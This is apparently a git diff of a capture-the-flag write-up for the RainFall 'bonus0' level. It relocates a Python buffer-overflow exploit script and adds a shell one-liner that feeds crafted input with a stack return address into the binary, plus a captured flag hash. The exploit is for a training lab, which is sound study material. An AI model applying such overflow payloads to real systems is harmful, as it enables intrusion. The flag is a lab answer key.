@@ -116,20 +116,6 @@ pick a random addr as starting of shellcode
 
 ```
 
-```
-bonus0@RainFall:~$ nano /var/tmp/exploit.py
-
-  import struct
-
-  shellcode = struct.pack("I", 0xbffffdf0)
-
-  #b1 = "A"*20
-  b2 = "B" * 9  + shellcode + "B"*7
-  #print b1
-  print b2
-
-```
-
 buffer [min, max] = [20, 4095]
 
 min 
@@ -146,8 +132,21 @@ max
  	read(0, buffer, 4096);
 	*strchr(buffer, '\n') = 0;
 	return (strncpy(s, buffer, 20));
- ```
+```
 
+
+```
+bonus0@RainFall:~$ nano /var/tmp/exploit.py
+
+  import struct
+
+  shellcode = struct.pack("I", 0xbffffdf0)
+
+  #b1 = "A"*20
+  b2 = "B" * 9  + shellcode + "B"*7
+  #print b1
+  print b2
+```
 
 ```
 	bonus0@RainFall:~$ python /var/tmp/exploit.py > /var/tmp/exp
@@ -160,6 +159,8 @@ max
 
 ```
 (python -c 'print "A" * 20' ; python -c 'print "B" * 9 + "\xbf\xff\xfd\xf0"[::-1] + "C" * 7' ; cat) | ./bonus0
+
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
 ```
 
 
